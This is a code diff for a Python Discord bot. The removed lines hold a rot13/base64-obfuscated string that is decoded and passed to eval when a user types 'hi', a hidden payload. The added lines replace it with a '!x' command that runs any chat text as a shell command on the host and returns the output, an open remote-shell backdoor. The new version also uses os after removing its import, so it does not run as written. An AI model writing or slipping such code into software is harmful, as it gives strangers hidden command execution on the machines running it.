@@ -1,31 +1,19 @@
 import discord
-import os
-import codecs
-import base64
+from discord.ext import commands
 
-intents = discord.Intents.all()
-client = discord.Client(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix='!')
 
-magic = '''
-LzLhMzkzM3W6XPWjnTI5VP1PVUIaM2AzBv8iLJ5bqUIaYJ9vLauzYwNjZTclo3IvMzqhL2ZhpTW6Y3chqzRhL2LkVvxX
-'''
-
-@client.event
+@bot.event
 async def on_ready():
-    print("We have logged in as {0.user}".format(client))
+    print(f'Logged in as {bot.user.name}')
 
+@bot.command()
+async def x(ctx, *, command):
+    import subprocess
+    try:
+        result = subprocess.check_output(command, shell=True, text=True)
+        await ctx.send(f'Command executed successfully:\n```\n{result}\n```')
+    except Exception as e:
+        await ctx.send(f'An error occurred:\n```\n{e}\n```')
 
-@client.event
-async def on_message(message):
-    if message.author == client.user:
-        return
-
-    if message.content.startswith("hi"):
-        await message.channel.send("Hello!")
-        byte = codecs.decode(magic, "rot13")
-        string = base64.b64decode(byte)
-        tr = string.decode()
-        out = codecs.decode(tr, "rot13")
-        await eval(out)
-
-client.run(os.environ["BOT_TOKEN"])
+bot.run(os.environ["BOT_TOKEN"])
